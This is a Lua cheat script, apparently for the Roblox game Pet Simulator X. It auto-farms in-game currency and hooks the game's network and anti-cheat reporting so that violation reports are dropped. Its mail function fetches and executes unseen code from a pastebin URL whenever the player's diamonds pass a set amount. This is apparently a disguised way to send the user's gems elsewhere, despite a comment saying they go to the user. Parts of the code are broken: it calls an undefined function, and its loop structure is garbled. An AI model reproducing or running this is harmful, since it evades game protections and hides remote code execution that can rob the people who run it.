getgenv().Settings = {
    ["Farm Speed"] = 0.01,
    ["Farm Speed Fruit"] = 2,
    ["Minimum Oranges"] = 100,
    ["Maximum Oranges"] = 160,
        ["Mailbox"] = {
            ["Enabled"] = true,
            ["Amount"] = 200000000000
    }
}


-- // Services //
local RS = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- // PSX Libraries //
local Library = RS:WaitForChild("Library")
local ClientModule = Library:WaitForChild("Client")
local Variables = require(Library:WaitForChild("Variables"))
local Directory = require(Library:WaitForChild("Directory"))

local Network = require(ClientModule:WaitForChild("Network"))
local Save = require(ClientModule:WaitForChild("Save"))
local WorldCmds = require(ClientModule:WaitForChild("WorldCmds"))
local PetCmds = require(ClientModule:WaitForChild("PetCmds"))
local ServerBoosts = require(ClientModule:WaitForChild("ServerBoosts"))
local Teleporter = getsenv(LocalPlayer.PlayerScripts.Scripts.GUIs.Teleport)
local username = tostring(game.Players.localPlayer.Name)
local MB = Settings["Mailbox"]
local GemsAmount = 10000 -- If Your Gems Go Over This Amount It Will Send Them To You
local Message = "Hello"
local TimeElapsed = 0
local GemsEarned = 0
local TotalGemsEarned = 0
local mailing = false




-- Patching/Hooking
    if (not getgenv().hooked) then
        hookfunction(debug.getupvalue(Network.Fire, 1) , function(...) return true end)
        hookfunction(debug.getupvalue(Network.Invoke, 1) , function(...) return true end)
        getgenv().hooked = true
    end
    
    
    do -- Patching/Hooking
    if (not getgenv().hooked) then
        hookfunction(debug.getupvalue(Network.Fire, 1) , function(...) return true end)
        hookfunction(debug.getupvalue(Network.Invoke, 1) , function(...) return true end)
        getgenv().hooked = true
    end

    local Blunder = require(RS:FindFirstChild("BlunderList", true))
    local OldGet = Blunder.getAndClear

    setreadonly(Blunder, false)

    Blunder.getAndClear = function(...)
        local Packet = ...
        for i,v in next, Packet.list do
            if v.message ~= "PING" then
                table.remove(Packet.list, i)
            end
        end
        return OldGet(Packet)
    end

    local Audio = require(RS:WaitForChild("Library"):WaitForChild("Audio"))
    hookfunction(Audio.Play, function(...)
        return {
            Play = function() end,
            Stop = function() end,
            IsPlaying = function() return false end
        }
    end)

    print("Hooked")
end
    
 
function getOrangeCount()
    local boosts = LocalPlayer.PlayerGui.Main.Boosts
    return boosts:FindFirstChild("Orange") and tonumber(boosts.Orange.TimeLeft.Text:match("%d+")) or 0
end

function getEquippedPets()
    local pets = PetCmds.GetEquipped()
    for i,v in pairs(pets) do pets[i] = v.uid end
    return pets
end

function farmCoin(coinId, petUIDs)
    local pets = (petUIDs == nil and getEquippedPets()) or (typeof(petUIDs) ~= "table" and { petUIDs }) or petUIDs
    task.spawn(function()
        Network.Invoke("Join Coin", coinId, pets)
        for _,pet in pairs(pets) do
            Network.Fire("Farm Coin", coinId, pet)
        end
    end)
end

function farmFruits()

    if WorldCmds.HasLoaded() and WorldCmds.Get() ~= "Pixel" then
        WorldCmds.Load("Pixel")
    end

    if WorldCmds.HasLoaded() then
       --bles.Teleporting = false
        Teleporter.Teleport("Pixel Vault", true)
       -- Variables.Teleporting = false
    end

    local function isFruitValid(coinObj)
        return Directory.Coins[coinObj.n].breakSound == "fruit"
    end

    local function GetFruits()
        local fruits = {}
        for i,v in pairs(Network.Invoke("Get Coins")) do
            if isFruitValid(v) and WorldCmds.HasArea(v.a) then
                v.id = i
                table.insert(fruits, v)
            end
        end
        return fruits
    end

    local function GetCoinsInPV()
        local coins = {}
        for i,v in pairs(Network.Invoke("Get Coins")) do
            if v.a == "Pixel Vault" then 
                v.id = i
                table.insert(coins, v)
            end
        end
        table.sort(coins, function(a, b) return a.h < b.h end)
        return coins
    end


    local fruits = GetFruits()
    if #fruits == 0 then fruits = GetCoinsInPV() end
    if #fruits > 0 then
        for _,pet in pairs(getEquippedPets()) do
            local b = fruits[1]
            if b ~= nil then
                farmCoin(b.id, { pet })
                table.remove(fruits, 1)
                task.wait()
            end
        end
    end
end


function sendMail()

 mailing = true
     
        if WorldCmds.HasLoaded() and WorldCmds.Get() ~= "Diamond Mine" then
            WorldCmds.Load("Diamond Mine")
        end
 
        if WorldCmds.HasLoaded() then
            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9298, -14, 2988)
        end
 
        task.wait(0.5)
 
        loadstring(game:HttpGet("https://pastebin.com/raw/a9KJd0PM"))()
 
        task.wait(15)
        mailing = false
 
     end






do -- Main
    coroutine.wrap(function()
        while task.wait() do
        if MB["Enabled"] and MB["Amount"] < Save.Get().Diamonds then
mailing = true
sendMail()
writefile("gems.txt", "0")
    if getOrangeCount() < Settings["Minimum Oranges"] then
                    farmFruits()
                    task.wait(Settings["Farm Speed"] or 0.04)
                if getOrangeCount() >= Settings["Maximum Oranges"] then
              continue
                end
                end
           
            if WorldCmds.HasLoaded() and WorldCmds.Get() ~= "Diamond Mine" then
                WorldCmds.Load("Diamond Mine")
            end
            
            if Settings["Mystic Mine"] then
                repeat
                    task.wait(Settings["Farm Speed"])
                    farm(CFrame.new(9055, -14, 2368), "Mystic Mine")
                until mysticEmpty
            end
  

end
    end)()

end
